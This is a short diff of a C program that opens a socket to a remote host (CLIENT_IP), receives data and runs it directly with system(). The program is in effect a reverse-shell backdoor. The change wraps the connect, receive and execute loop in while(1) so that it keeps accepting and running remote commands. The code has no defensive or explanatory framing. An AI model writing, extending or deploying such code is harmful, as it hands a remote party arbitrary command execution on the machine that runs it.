@@ -26,6 +26,7 @@ int main(int argc, char **argv){
     self.sin_family=AF_INET;
     self.sin_port=htons(PORT);
     self.sin_addr.s_addr=inet_addr(CLIENT_IP);
+    while(1){
     if(connect(sockets, (struct sockaddr *)&self, sizeof(self))<0){
       printf("\n Error : Connect Failed \n");
       return 1;
@@ -41,6 +42,7 @@ int main(int argc, char **argv){
         }*/
 		    system(receive_buffer);
         printf("\n");
+    }
     }
   return 0;
 }
